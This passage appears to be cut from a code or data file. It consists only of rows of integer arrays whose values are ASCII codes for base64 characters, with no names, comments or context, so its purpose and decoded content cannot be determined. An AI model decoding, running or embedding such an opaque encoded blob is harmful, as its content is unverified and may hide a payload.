  [97, 72, 104, 111, 117, 78, 120, 73, 113, 74, 109, 52, 50, 106, 106, 90, 72, 71, 104, 73, 50, 71, 106, 53, 121, 65, 119, 100, 80, 105, 105, 52, 101, 71, 109],
  [53, 122, 73, 109, 73, 83, 74, 103, 89, 97, 113, 107, 90, 121, 78, 109, 57, 114, 86, 109, 111, 118, 99, 119, 73, 79, 78, 107, 97, 87, 74, 110, 77, 83, 76],
  [103, 90, 105, 65, 106, 90, 114, 97, 119, 100, 80, 105, 105, 52, 101, 71, 109, 53, 122, 73, 103, 112, 117, 72, 104, 116, 114, 86, 105, 112, 71, 99, 106, 90, 117],
  [56, 104, 55, 50, 99, 106, 116, 68, 65, 109, 73, 83, 74, 103, 89, 97, 113, 107, 90, 121, 78, 109, 57, 114, 66, 48, 43, 75, 97, 106, 90, 121, 100, 109, 111],
  [98, 73, 111, 114, 117, 110, 112, 115, 97, 89, 105, 90, 113, 98, 106, 99, 67, 67, 109, 52, 101, 71, 50, 115, 72, 84, 52, 112, 88, 105, 108, 101, 75, 97, 106],
  [90, 121, 100, 109, 111, 98, 73, 104, 52, 113, 67, 48, 43, 75, 86, 52, 112, 88, 105, 103, 89, 55, 65, 104, 52, 113, 67, 120, 111, 50, 71, 105, 57, 88, 86],
  [49, 99, 43, 90, 50, 115, 47, 66, 107, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 89, 105, 89, 117, 68, 106, 89, 122, 86, 105, 116, 55, 99, 110, 90, 113],
  [69, 118, 73, 101, 113, 107, 90, 121, 78, 109, 56, 67, 72, 105, 111, 76, 71, 109, 99, 72, 84, 52, 111, 71, 79, 119, 77, 109, 89, 105, 89, 117, 68, 106, 89],
  [121, 85, 108, 74, 105, 74, 105, 52, 79, 78, 106, 77, 97, 69, 106, 89, 97, 80, 110, 73, 68, 85, 48, 99, 71, 97, 106, 90, 121, 100, 109, 111, 98, 73, 104],
  [52, 113, 67, 48, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 71, 104, 52, 97, 76, 106, 100, 87, 89, 105, 89, 117, 68, 106, 89, 122, 71, 109, 52, 83, 66],
  [105, 52, 51, 65, 50, 77, 84, 81, 119, 100, 80, 105, 105, 52, 101, 71, 109, 53, 122, 73, 105, 52, 71, 89, 103, 73, 50, 97, 49, 90, 105, 74, 105, 52, 79],
  [78, 106, 77, 97, 98, 104, 73, 71, 76, 106, 99, 68, 81, 119, 100, 80, 105, 105, 52, 101, 71, 109, 53, 122, 73, 103, 52, 50, 82, 112, 89, 109, 99, 49, 89],
  [97, 78, 110, 56, 105, 57, 103, 89, 97, 99, 48, 75, 109, 97, 109, 111, 109, 82, 119, 73, 113, 74, 109, 52, 50, 106, 106, 90, 72, 71, 104, 73, 50, 71, 106],
  [53, 121, 65, 119, 52, 97, 72, 104, 111, 117, 78, 120, 111, 83, 78, 104, 111, 43, 99, 103, 77, 72, 84, 52, 111, 79, 78, 107, 97, 87, 74, 110, 77, 97, 98],
  [106, 90, 122, 65, 105, 111, 109, 98, 106, 97, 79, 78, 107, 99, 84, 89, 119, 100, 80, 105, 103, 52, 50, 82, 112, 89, 109, 99, 120, 112, 117, 78, 110, 77, 67],
  [71, 104, 52, 97, 76, 106, 99, 83, 75, 105, 90, 117, 78, 111, 52, 50, 82, 120, 111, 83, 78, 104, 111, 43, 99, 103, 77, 72, 84, 52, 111, 117, 72, 104, 112],
  [117, 99, 121, 74, 105, 69, 105, 89, 71, 71, 113, 112, 71, 99, 106, 90, 118, 86, 109, 111, 118, 99, 119, 73, 79, 78, 107, 97, 87, 74, 110, 77, 83, 76, 103],
  [90, 105, 65, 106, 90, 114, 66, 48, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 67, 109, 52, 101, 71, 49, 89, 113, 82, 110, 73, 50, 98, 118, 73, 101, 57],
  [110, 73, 55, 81, 119, 74, 105, 69, 105, 89, 71, 71, 113, 112, 71, 99, 106, 90, 118, 66, 48, 43, 75, 97, 106, 90, 121, 100, 109, 111, 98, 73, 111, 114, 117],
  [110, 112, 115, 97, 89, 105, 90, 113, 98, 106, 99, 67, 67, 109, 52, 101, 71, 119, 100, 80, 105, 108, 101, 75, 97, 106, 90, 121, 100, 109, 111, 98, 73, 104, 52],
  [113, 67, 48, 43, 75, 86, 105, 52, 109, 99, 105, 52, 68, 65, 106, 99, 71, 84, 52, 112, 113, 78, 110, 74, 50, 97, 104, 115, 105, 72, 105, 111, 76, 84, 52],
  [112, 88, 105, 108, 101, 75, 99, 109, 112, 71, 84, 52, 112, 43, 66, 104, 111, 121, 72, 110, 56, 97, 51, 116, 52, 113, 102, 114, 73, 50, 76, 109, 112, 71, 89],
  [110, 75, 109, 89, 103, 97, 50, 71, 110, 111, 50, 69, 104, 53, 105, 78, 49, 89, 121, 78, 105, 53, 113, 82, 109, 74, 121, 112, 109, 73, 71, 116, 104, 112, 54],
  [78, 104, 73, 101, 89, 106, 100, 80, 105, 108, 89, 117, 74, 110, 73, 117, 65, 119, 73, 51, 66, 107, 53, 88, 105, 104, 73, 50, 99, 121, 74, 117, 65, 104, 53],
  [43, 115, 106, 89, 83, 74, 107, 100, 87, 115, 114, 97, 54, 112, 118, 97, 83, 56, 116, 55, 117, 103, 112, 55, 43, 51, 114, 75, 50, 107, 113, 98, 72, 84, 52],
  [111, 83, 78, 110, 77, 105, 70, 104, 52, 121, 78, 49, 99, 43, 75, 109, 111, 101, 102, 109, 52, 50, 97, 122, 57, 80, 105, 106, 112, 50, 71, 105, 53, 121, 66],
  [104, 52, 98, 73, 106, 111, 50, 99, 105, 52, 67, 47, 103, 90, 121, 65, 118, 73, 71, 70, 106, 89, 101, 100, 110, 77, 67, 100, 109, 111, 84, 69, 104, 53, 105],
  [99, 103, 89, 101, 71, 109, 56, 83, 99, 103, 89, 87, 78, 104, 53, 50, 99, 112, 90, 118, 66, 107, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 76, 104, 52],
  [97, 99, 109, 111, 101, 69, 104, 73, 50, 97, 49, 89, 97, 78, 110, 56, 105, 112, 105, 111, 101, 97, 110, 75, 117, 72, 104, 112, 121, 97, 104, 52, 83, 69, 106],
  [90, 114, 65, 119, 100, 80, 105, 105, 52, 101, 71, 109, 53, 122, 73, 110, 73, 71, 70, 106, 89, 101, 100, 110, 75, 71, 77, 49, 90, 117, 78, 110, 76, 121, 66],
  [104, 89, 50, 72, 110, 90, 122, 65, 119, 77, 72, 86, 49, 111, 117, 72, 104, 112, 121, 97, 104, 52, 83, 69, 106, 90, 114, 71, 105, 89, 113, 72, 109, 112, 122],
  [65, 119, 99, 83, 99, 103, 89, 87, 78, 104, 53, 50, 99, 112, 90, 117, 85, 108, 78, 51, 89, 50, 78, 106, 66, 48, 43, 75, 76, 104, 52, 97, 98, 110, 77],
  [105, 72, 109, 74, 121, 98, 49, 97, 101, 75, 103, 111, 50, 76, 110, 77, 97, 74, 109, 53, 117, 66, 106, 52, 98, 65, 107, 53, 88, 69, 104, 53, 105, 99, 103],
  [89, 101, 71, 109, 53, 83, 85, 107, 53, 88, 69, 107, 53, 117, 66, 106, 52, 97, 74, 104, 78, 75, 76, 104, 52, 97, 99, 109, 111, 101, 69, 104, 73, 50, 97],
  [120, 112, 117, 66, 106, 52, 97, 74, 104, 74, 88, 66, 48, 43, 75, 97, 106, 90, 121, 100, 109, 111, 98, 73, 106, 111, 50, 99, 105, 52, 68, 65, 110, 90, 113],
  [69, 120, 73, 101, 89, 110, 74, 118, 66, 120, 111, 54, 66, 104, 111, 109, 69, 104, 74, 72, 65, 119, 77, 72, 86, 49, 111, 117, 69, 106, 89, 109, 97, 118, 73],
  [71, 70, 106, 89, 101, 100, 110, 77, 67, 99, 103, 89, 87, 78, 104, 53, 50, 99, 111, 89, 122, 66, 119, 100, 80, 105, 108, 101, 75, 74, 109, 53, 71, 71, 105],
  [56, 105, 79, 110, 89, 97, 76, 110, 73, 71, 72, 104, 115, 105, 79, 106, 90, 121, 76, 103, 75, 75, 98, 104, 52, 97, 47, 103, 90, 121, 65, 118, 73, 71, 70],
  [106, 89, 101, 100, 110, 77, 67, 100, 109, 111, 84, 69, 104, 53, 105, 99, 103, 89, 101, 71, 109, 56, 83, 99, 103, 89, 87, 78, 104, 53, 50, 99, 112, 90, 118],
  [66, 107, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 97, 106, 90, 117, 89, 49, 89, 109, 102, 105, 89, 71, 99, 121, 73, 54, 78, 110, 73, 117, 65, 118, 52],
  [71, 99, 103, 76, 121, 66, 104, 89, 50, 72, 110, 90, 122, 65, 110, 90, 113, 69, 120, 73, 101, 89, 110, 73, 71, 72, 104, 112, 118, 69, 110, 73, 71, 70, 106],
  [89, 101, 100, 110, 75, 87, 98, 119, 100, 80, 105, 103, 89, 55, 65, 121, 90, 113, 78, 109, 53, 106, 71, 104, 52, 80, 66, 110, 73, 67, 97, 104, 53, 47, 73],
  [104, 111, 50, 102, 121, 75, 50, 97, 109, 111, 101, 97, 119, 77, 43, 65, 110, 74, 121, 89, 116, 56, 47, 68, 109, 111, 50, 98, 109, 77, 97, 98, 110, 73, 109],
  [99, 110, 90, 118, 66, 48, 43, 75, 97, 106, 90, 121, 100, 109, 111, 98, 73, 105, 90, 43, 74, 103, 90, 122, 73, 109, 111, 50, 98, 109, 77, 97, 67, 109, 52],
  [101, 71, 119, 77, 72, 84, 52, 112, 88, 105, 106, 112, 50, 71, 105, 53, 121, 66, 104, 52, 98, 73, 106, 73, 50, 76, 104, 52, 121, 78, 111, 73, 50, 81, 117],
  [53, 121, 97, 103, 89, 97, 80, 119, 73, 67, 78, 107, 77, 71, 84, 52, 112, 121, 97, 107, 90, 80, 105, 104, 73, 50, 99, 121, 74, 113, 78, 109, 53, 50, 69],
  [110, 78, 88, 80, 122, 57, 80, 105, 106, 111, 101, 97, 119, 73, 83, 78, 110, 77, 105, 66, 49, 100, 106, 84, 103, 100, 83, 65, 106, 90, 68, 71, 104, 73, 50],
  [71, 106, 53, 121, 65, 48, 52, 72, 68, 49, 100, 114, 66, 107, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 75, 107, 90, 121, 78, 117, 53, 121, 97, 103, 89],
  [97, 80, 49, 89, 67, 78, 107, 77, 97, 98, 110, 89, 113, 98, 110, 74, 114, 65, 103, 99, 84, 97, 119, 100, 80, 105, 105, 52, 101, 71, 109, 53, 122, 73, 105],
  [112, 71, 99, 106, 100, 87, 89, 105, 90, 113, 98, 106, 97, 71, 71, 110, 77, 67, 75, 107, 90, 121, 78, 117, 53, 121, 97, 103, 89, 97, 80, 120, 78, 110, 101],
  [119, 100, 80, 105, 103, 89, 55, 65, 105, 112, 71, 99, 106, 100, 98, 89, 119, 90, 113, 78, 109, 53, 50, 69, 110, 77, 80, 86, 117, 53, 121, 97, 103, 89, 97],
  [80, 120, 111, 54, 97, 104, 52, 87, 114, 103, 73, 109, 97, 113, 52, 101, 77, 106, 99, 67, 75, 107, 90, 121, 78, 119, 100, 80, 105, 108, 101, 75, 97, 106, 90],
  [121, 100, 109, 111, 98, 73, 109, 111, 50, 98, 110, 89, 83, 99, 48, 43, 75, 86, 105, 52, 109, 99, 105, 52, 68, 65, 106, 99, 71, 84, 52, 112, 113, 78, 110],
  [74, 50, 97, 104, 115, 47, 80, 48, 43, 75, 86, 52, 112, 88, 105, 106, 112, 50, 71, 105, 53, 121, 66, 104, 52, 98, 73, 106, 73, 50, 76, 104, 52, 121, 78],
  [117, 111, 50, 98, 110, 89, 83, 99, 119, 74, 113, 78, 109, 53, 50, 69, 110, 77, 71, 84, 52, 112, 121, 97, 107, 90, 80, 105, 105, 52, 101, 71, 109, 53, 122],
  [73, 103, 73, 50, 81, 114, 73, 109, 99, 105, 100, 87, 97, 106, 90, 117, 100, 104, 74, 122, 71, 109, 53, 121, 74, 109, 112, 121, 98, 118, 52, 71, 99, 103, 77],
  [68, 80, 50, 74, 68, 80, 119, 100, 101, 97, 106, 90, 117, 100, 104, 74, 122, 71, 109, 53, 50, 75, 109, 53, 121, 97, 119, 78, 114, 66, 48, 112, 113, 78, 109],
  [53, 50, 69, 110, 78, 80, 105, 103, 89, 55, 65, 103, 73, 50, 81, 114, 73, 109, 99, 105, 99, 97, 69, 106, 89, 97, 80, 110, 73, 68, 85, 50, 100, 114, 81],
  [119, 90, 113, 78, 110, 74, 50, 97, 104, 115, 47, 80, 48, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 69, 106, 89, 97, 80, 110, 73, 67, 103, 106, 90, 68],
  [86, 103, 73, 50, 81, 114, 73, 109, 99, 105, 99, 97, 98, 110, 89, 113, 98, 110, 74, 114, 65, 51, 116, 122, 69, 51, 116, 122, 66, 48, 43, 75, 76, 104, 52],
  [97, 98, 110, 77, 105, 69, 106, 89, 97, 80, 110, 73, 68, 86, 109, 73, 109, 97, 109, 52, 50, 104, 104, 112, 122, 65, 104, 73, 50, 71, 106, 53, 121, 65, 111],
  [73, 50, 81, 120, 78, 110, 101, 119, 100, 80, 105, 103, 89, 55, 65, 104, 73, 50, 71, 106, 53, 121, 65, 49, 116, 106, 79, 122, 111, 67, 78, 107, 75, 121, 74],
  [110, 73, 110, 71, 104, 73, 50, 71, 106, 53, 121, 65, 49, 116, 88, 90, 50, 116, 68, 68, 104, 73, 50, 71, 106, 53, 121, 65, 119, 116, 114, 66, 107, 43, 75],
  [76, 104, 52, 97, 98, 110, 77, 105, 98, 110, 74, 113, 66, 104, 111, 43, 103, 106, 90, 68, 86, 103, 73, 50, 81, 114, 73, 109, 99, 105, 99, 97, 98, 110, 89],
  [113, 98, 110, 74, 114, 65, 50, 100, 114, 81, 120, 73, 83, 78, 104, 111, 43, 99, 103, 77, 76, 97, 119, 100, 80, 105, 109, 111, 50, 99, 110, 90, 113, 71, 121],
  [73, 121, 78, 105, 52, 101, 77, 106, 97, 67, 78, 107, 76, 117, 99, 109, 111, 71, 71, 106, 56, 67, 98, 110, 74, 113, 66, 104, 111, 43, 103, 106, 90, 68, 66],
  [48, 43, 75, 86, 52, 112, 113, 78, 110, 74, 50, 97, 104, 115, 47, 80, 48, 43, 75, 86, 105, 52, 109, 99, 105, 52, 68, 65, 106, 99, 71, 84, 52, 112, 113],
  [78, 110, 74, 50, 97, 104, 115, 47, 80, 48, 43, 75, 86, 52, 112, 88, 105, 105, 90, 117, 82, 104, 111, 118, 73, 106, 112, 50, 71, 105, 53, 121, 66, 104, 52],
  [98, 73, 109, 73, 101, 98, 110, 75, 75, 98, 104, 52, 97, 47, 103, 90, 121, 65, 118, 73, 71, 70, 106, 89, 101, 100, 110, 77, 67, 100, 109, 111, 84, 69, 105],
  [111, 101, 77, 107, 99, 83, 99, 103, 89, 87, 78, 104, 53, 50, 99, 112, 90, 118, 66, 107, 43, 75, 97, 106, 90, 121, 100, 109, 111, 98, 73, 105, 90, 43, 74],
  [103, 90, 122, 73, 106, 111, 50, 99, 105, 52, 67, 105, 109, 52, 101, 71, 118, 52, 71, 99, 103, 76, 121, 66, 104, 89, 50, 72, 110, 90, 122, 65, 110, 90, 113],
  [69, 120, 74, 80, 105, 104, 89, 50, 99, 103, 73, 101, 77, 48, 115, 43, 52, 112, 55, 117, 56, 122, 56, 84, 105, 103, 73, 50, 74, 106, 73, 50, 97, 109, 57],
  [75, 84, 52, 115, 43, 114, 104, 52, 97, 99, 106, 89, 97, 99, 120, 98, 121, 82, 109, 73, 51, 80, 48, 115, 43, 74, 109, 74, 105, 69, 103, 89, 117, 74, 110],
  [73, 71, 72, 104, 115, 101, 67, 109, 52, 101, 71, 122, 56, 84, 105, 122, 54, 109, 76, 105, 52, 50, 89, 110, 77, 47, 83, 122, 52, 109, 89, 109, 73, 83, 66],
  [105, 52, 109, 99, 103, 89, 101, 71, 120, 52, 75, 98, 104, 52, 98, 80, 52, 112, 88, 69, 52, 111, 113, 72, 106, 74, 72, 83, 111, 114, 117, 110, 112, 115, 97],
  [98, 110, 74, 113, 66, 104, 111, 43, 66, 106, 112, 72, 65, 105, 111, 101, 77, 107, 99, 72, 69, 52, 111, 117, 74, 105, 52, 67, 78, 48, 115, 43, 71, 104, 56],
  [87, 98, 110, 73, 101, 97, 106, 99, 47, 105, 108, 99, 83, 99, 103, 89, 87, 78, 104, 53, 50, 99, 112, 90, 118, 66, 48, 43, 75, 86, 52, 111, 109, 98, 107],
  [89, 97, 76, 121, 73, 54, 100, 104, 111, 117, 99, 103, 89, 101, 71, 121, 73, 43, 78, 110, 76, 50, 97, 104, 75, 54, 97, 104, 52, 87, 114, 104, 52, 97, 99],
  [109, 111, 109, 76, 110, 77, 68, 66, 107, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 77, 105, 90, 121, 74, 114, 111, 71, 78, 104, 73, 122, 86, 122, 57, 105],
  [81, 122, 56, 79, 114, 112, 54, 97, 56, 117, 113, 109, 114, 118, 76, 101, 114, 112, 54, 97, 117, 111, 97, 47, 71, 114, 114, 50, 109, 113, 55, 121, 104, 112, 54],
  [97, 51, 117, 54, 50, 107, 114, 97, 117, 56, 112, 55, 114, 84, 52, 111, 117, 72, 104, 112, 117, 99, 121, 74, 105, 74, 109, 111, 109, 70, 109, 57, 87, 122, 107],
  [53, 121, 72, 48, 113, 117, 110, 112, 114, 121, 54, 113, 97, 117, 56, 116, 54, 117, 110, 112, 113, 54, 104, 114, 56, 97, 114, 112, 54, 97, 56, 117, 113, 109, 114],
  [118, 76, 101, 112, 114, 75, 121, 54, 114, 98, 117, 55, 120, 73, 121, 74, 110, 73, 110, 83, 106, 73, 109, 99, 105, 97, 54, 66, 106, 89, 83, 77, 108, 99, 84],
  [80, 104, 73, 109, 99, 106, 90, 117, 99, 122, 55, 88, 84, 52, 111, 117, 72, 104, 112, 117, 99, 121, 74, 113, 78, 109, 90, 50, 78, 109, 53, 121, 113, 104, 52],
  [121, 82, 49, 90, 79, 67, 109, 52, 101, 71, 109, 112, 105, 76, 48, 115, 47, 97, 120, 116, 106, 80, 120, 73, 87, 78, 110, 73, 67, 72, 106, 78, 76, 80, 106],
  [90, 121, 65, 116, 52, 117, 74, 104, 73, 84, 80, 120, 74, 105, 74, 109, 111, 109, 70, 109, 56, 83, 66, 106, 78, 76, 90, 108, 100, 80, 105, 106, 111, 101, 97],
  [119, 73, 83, 78, 110, 77, 105, 74, 110, 74, 121, 78, 104, 90, 105, 99, 49, 100, 106, 84, 105, 90, 121, 99, 106, 89, 87, 89, 110, 78, 84, 65, 113, 54, 101],
  [109, 118, 76, 113, 112, 113, 55, 121, 51, 113, 54, 101, 109, 114, 113, 71, 118, 120, 113, 87, 112, 115, 76, 101, 54, 114, 98, 121, 54, 111, 97, 50, 55, 108, 74],
  [84, 90, 119, 100, 79, 74, 110, 74, 121, 78, 104, 90, 105, 99, 119, 56, 80, 66, 107, 43, 75, 79, 104, 53, 114, 65, 105, 52, 101, 71, 109, 53, 122, 73, 106],
  [89, 97, 77, 109, 73, 101, 66, 104, 112, 122, 73, 104, 52, 55, 65, 113, 54, 101, 109, 118, 76, 113, 112, 113, 55, 121, 51, 113, 54, 101, 109, 114, 113, 71, 118],
  [120, 114, 113, 52, 113, 55, 101, 103, 112, 55, 117, 56, 117, 53, 83, 85, 115, 55, 88, 66, 119, 90, 80, 105, 110, 74, 113, 82, 107, 43, 75, 76, 104, 52, 97],
  [98, 110, 77, 105, 77, 105, 90, 121, 74, 49, 89, 109, 102, 105, 89, 71, 99, 121, 74, 105, 72, 109, 53, 121, 105, 109, 52, 101, 71, 118, 52, 71, 99, 103, 76],
  [121, 66, 104, 89, 50, 72, 110, 90, 122, 65, 106, 89, 97, 77, 109, 73, 101, 66, 104, 112, 122, 69, 109, 111, 50, 90, 110, 89, 50, 98, 110, 75, 113, 72, 106],
  [74, 72, 69, 113, 54, 101, 109, 118, 76, 113, 112, 113, 55, 121, 51, 113, 54, 101, 109, 114, 113, 71, 118, 120, 114, 121, 104, 112, 97, 50, 110, 118, 98, 121, 51],
  [112, 98, 117, 85, 108, 78, 51, 89, 50, 78, 106, 66, 48, 43, 75, 66, 106, 115, 67, 77, 105, 90, 121, 74, 122, 115, 54, 77, 105, 90, 121, 74, 120, 112, 113],
  [78, 109, 53, 50, 69, 110, 77, 71, 84, 52, 111, 117, 72, 104, 112, 117, 99, 121, 73, 121, 72, 104, 89, 109, 66, 104, 116, 87, 77, 106, 89, 117, 72, 106, 73],
  [50, 54, 106, 90, 117, 100, 104, 74, 122, 65, 106, 73, 109, 99, 105, 99, 97, 97, 106, 90, 117, 100, 104, 74, 122, 66, 48, 43, 75, 66, 106, 115, 67, 77, 104],
  [52, 87, 74, 103, 89, 98, 79, 122, 111, 121, 72, 104, 89, 109, 66, 104, 115, 97, 69, 106, 89, 97, 80, 110, 73, 68, 87, 50, 77, 71, 84, 52, 111, 83, 78],
  [110, 77, 105, 100, 109, 111, 84, 86, 106, 73, 101, 70, 105, 89, 71, 71, 120, 112, 121, 97, 103, 89, 88, 65, 119, 100, 80, 105, 103, 89, 55, 65, 121, 90, 50],
  [97, 104, 77, 97, 98, 110, 73, 109, 97, 110, 74, 117, 47, 103, 90, 121, 65, 119, 77, 43, 65, 110, 74, 121, 89, 122, 56, 72, 66, 110, 90, 113, 69, 49, 99],
  [43, 65, 110, 74, 121, 89, 109, 57, 76, 72, 120, 56, 47, 68, 110, 90, 113, 69, 48, 43, 75, 97, 106, 90, 121, 100, 109, 111, 98, 73, 110, 90, 113, 69, 48],
  [43, 75, 86, 52, 112, 88, 105, 108, 89, 117, 74, 110, 73, 117, 65, 119, 73, 51, 66, 107, 53, 88, 105, 108, 101, 75, 86, 52, 112, 113, 78, 110, 74, 50, 97],
  [104, 115, 105, 71, 110, 89, 83, 69, 48, 43, 75, 86, 52, 111, 54, 100, 104, 111, 117, 99, 103, 89, 101, 71, 121, 74, 50, 89, 106, 73, 109, 99, 106, 98, 50],
  [97, 104, 74, 118, 65, 105, 111, 109, 98, 106, 98, 50, 97, 104, 77, 71, 84, 52, 111, 71, 79, 119, 77, 109, 75, 105, 90, 117, 78, 118, 90, 113, 69, 119, 90],
  [113, 78, 110, 74, 50, 97, 104, 116, 80, 105, 109, 73, 109, 71, 106, 89, 83, 113, 105, 90, 117, 78, 118, 90, 113, 69, 49, 89, 113, 74, 109, 52, 50, 57, 109],
  [111, 84, 71, 109, 111, 50, 89, 104, 73, 109, 76, 106, 99, 68, 72, 116, 77, 102, 77, 120, 56, 84, 80, 122, 56, 72, 84, 52, 111, 109, 89, 103, 97, 113, 74],
  [109, 52, 51, 86, 109, 73, 109, 71, 106, 89, 83, 113, 105, 90, 117, 78, 118, 90, 113, 69, 48, 43, 75, 69, 104, 52, 43, 57, 109, 111, 84, 86, 105, 112, 50],
  [66, 104, 73, 121, 112, 109, 73, 71, 57, 109, 111, 84, 65, 107, 52, 110, 83, 122, 52, 50, 101, 110, 77, 43, 86, 119, 90, 83, 85, 119, 73, 109, 89, 103, 97],
  [113, 74, 109, 52, 51, 68, 122, 56, 101, 74, 109, 73, 72, 72, 103, 89, 97, 77, 106, 90, 68, 71, 109, 73, 67, 89, 49, 52, 110, 86, 106, 90, 54, 99, 122],
  [56, 72, 84, 52, 112, 121, 72, 103, 52, 50, 71, 118, 90, 113, 69, 49, 89, 113, 100, 103, 89, 83, 77, 113, 90, 105, 66, 118, 90, 113, 69, 119, 74, 79, 74],
  [48, 115, 43, 66, 104, 111, 71, 99, 122, 53, 88, 66, 108, 74, 84, 65, 105, 90, 105, 66, 113, 111, 109, 98, 106, 99, 80, 80, 120, 52, 109, 89, 103, 99, 101],
  [66, 104, 111, 121, 78, 107, 77, 97, 89, 103, 74, 106, 88, 105, 100, 87, 66, 104, 111, 71, 99, 122, 56, 72, 84, 52, 111, 121, 72, 110, 52, 97, 69, 104, 52],
  [109, 77, 118, 90, 113, 69, 49, 89, 113, 100, 103, 89, 83, 77, 113, 90, 105, 66, 118, 90, 113, 69, 119, 74, 79, 74, 48, 115, 43, 77, 104, 77, 43, 86, 119],
  [90, 83, 85, 119, 73, 109, 89, 103, 97, 113, 74, 109, 52, 51, 68, 122, 56, 101, 74, 109, 73, 72, 72, 103, 89, 97, 77, 106, 90, 68, 71, 109, 73, 67, 89],
  [49, 52, 110, 86, 106, 73, 84, 80, 119, 100, 80, 105, 108, 101, 75, 74, 109, 53, 71, 71, 105, 56, 105, 79, 110, 89, 97, 76, 110, 73, 71, 72, 104, 115, 105],
  [97, 106, 89, 54, 97, 106, 90, 117, 65, 113, 52, 101, 71, 106, 111, 71, 80, 114, 112, 113, 72, 104, 97, 109, 89, 103, 99, 68, 66, 107, 43, 75, 99, 109, 112],
  [71, 84, 52, 111, 117, 72, 104, 112, 117, 99, 121, 73, 117, 72, 104, 112, 121, 97, 105, 89, 117, 99, 118, 90, 113, 69, 49, 89, 109, 102, 105, 89, 71, 99, 121],
  [73, 43, 78, 110, 76, 50, 97, 104, 75, 54, 97, 104, 52, 87, 114, 104, 52, 97, 99, 109, 111, 109, 76, 110, 77, 68, 66, 48, 43, 75, 66, 106, 115, 68, 74],
  [105, 52, 101, 71, 110, 74, 113, 74, 105, 53, 121, 57, 109, 111, 84, 66, 110, 73, 67, 97, 104, 53, 47, 73, 104, 111, 50, 102, 121, 75, 50, 97, 109, 111, 101],
  [97, 119, 77, 43, 113, 109, 111, 101, 102, 109, 52, 50, 97, 118, 52, 109, 97, 104, 111, 71, 71, 106, 57, 76, 73, 114, 111, 109, 66, 104, 73, 50, 77, 121, 74],
  [121, 72, 121, 73, 43, 78, 110, 77, 105, 57, 117, 113, 84, 73, 106, 112, 113, 72, 104, 99, 105, 76, 104, 52, 97, 99, 109, 111, 109, 76, 110, 77, 47, 66, 48],
  [43, 75, 100, 109, 73, 121, 74, 110, 73, 50, 57, 109, 111, 83, 98, 119, 73, 117, 72, 104, 112, 121, 97, 105, 89, 117, 99, 118, 90, 113, 69, 119, 100, 80, 105],
  [105, 52, 101, 71, 109, 53, 122, 73, 109, 52, 50, 99, 110, 73, 71, 71, 106, 53, 117, 57, 109, 111, 84, 86, 105, 112, 50, 66, 104, 73, 121, 112, 109, 73, 71],
  [57, 109, 111, 84, 65, 107, 52, 110, 83, 122, 52, 117, 79, 106, 56, 43, 86, 119, 90, 83, 85, 119, 73, 117, 72, 104, 112, 121, 97, 105, 89, 117, 99, 118, 90],
  [113, 69, 119, 56, 47, 72, 105, 90, 105, 66, 120, 52, 71, 71, 106, 73, 50, 81, 120, 112, 105, 65, 109, 78, 101, 74, 49, 89, 117, 79, 106, 56, 47, 66, 48],
  [43, 75, 69, 106, 90, 122, 73, 109, 111, 50, 70, 104, 53, 121, 78, 49, 89, 109, 102, 105, 89, 71, 99, 121, 73, 54, 78, 110, 73, 117, 65, 111, 112, 117, 72],
  [104, 114, 43, 66, 110, 73, 67, 56, 103, 89, 87, 78, 104, 53, 50, 99, 119, 74, 117, 78, 110, 74, 121, 66, 104, 111, 43, 98, 118, 90, 113, 69, 120, 74, 79],
  [76, 105, 89, 117, 65, 106, 100, 76, 80, 104, 111, 102, 70, 109, 53, 121, 72, 109, 111, 51, 80, 108, 99, 84, 100, 50, 78, 106, 89, 119, 100, 80, 105, 109, 111],
  [50, 70, 104, 53, 121, 78, 49, 89, 109, 102, 105, 89, 71, 99, 121, 73, 121, 78, 105, 53, 113, 82, 109, 74, 121, 112, 109, 73, 71, 116, 104, 112, 54, 78, 104],
  [73, 101, 89, 106, 99, 67, 97, 106, 89, 87, 72, 110, 73, 51, 69, 122, 52, 117, 79, 106, 56, 47, 66, 48, 43, 75, 66, 106, 115, 68, 74, 109, 111, 50, 70],
  [104, 53, 121, 78, 108, 74, 83, 99, 107, 90, 105, 78, 104, 52, 55, 73, 109, 111, 50, 70, 104, 53, 121, 78, 121, 100, 88, 86, 122, 52, 101, 75, 103, 111, 50],
  [76, 110, 77, 47, 66, 110, 73, 67, 97, 104, 53, 47, 73, 104, 111, 50, 102, 121, 75, 50, 97, 109, 111, 101, 97, 119, 77, 43, 113, 109, 111, 101, 102, 109, 52],
  [50, 97, 118, 52, 109, 97, 104, 111, 71, 71, 106, 57, 76, 73, 103, 89, 97, 101, 105, 89, 83, 66, 106, 77, 105, 98, 106, 90, 121, 99, 103, 89, 97, 80, 109],
  [56, 105, 89, 105, 90, 71, 69, 104, 52, 109, 77, 122, 56, 72, 84, 52, 111, 117, 79, 106, 57, 87, 110, 105, 111, 75, 78, 105, 53, 122, 71, 105, 90, 117, 98],
  [103, 89, 43, 71, 119, 74, 79, 86, 120, 74, 113, 78, 104, 89, 101, 99, 106, 99, 72, 84, 52, 111, 71, 79, 119, 73, 117, 79, 106, 56, 97, 76, 104, 52, 97],
  [99, 109, 111, 109, 76, 110, 75, 117, 72, 104, 111, 54, 66, 106, 56, 71, 84, 52, 112, 121, 97, 107, 90, 79, 110, 105, 111, 75, 78, 105, 53, 122, 71, 105, 90],
  [117, 98, 103, 89, 43, 71, 119, 75, 117, 110, 112, 114, 121, 54, 113, 97, 117, 56, 116, 54, 117, 110, 112, 113, 54, 104, 114, 56, 83, 76, 106, 111, 47, 71, 105],
  [52, 101, 71, 110, 74, 113, 74, 105, 53, 121, 114, 104, 52, 97, 79, 103, 89, 47, 66, 48, 53, 87, 76, 105, 90, 121, 76, 103, 77, 67, 78, 119, 90, 79, 86],
  [52, 112, 88, 105, 103, 89, 55, 65, 105, 52, 54, 80, 120, 112, 105, 74, 104, 111, 50, 69, 113, 111, 109, 98, 106, 98, 50, 97, 104, 77, 55, 79, 105, 52, 54],
  [80, 120, 112, 105, 74, 104, 111, 50, 69, 113, 111, 109, 98, 106, 98, 50, 97, 104, 77, 110, 86, 49, 90, 105, 74, 104, 111, 50, 69, 113, 111, 109, 98, 106, 98],
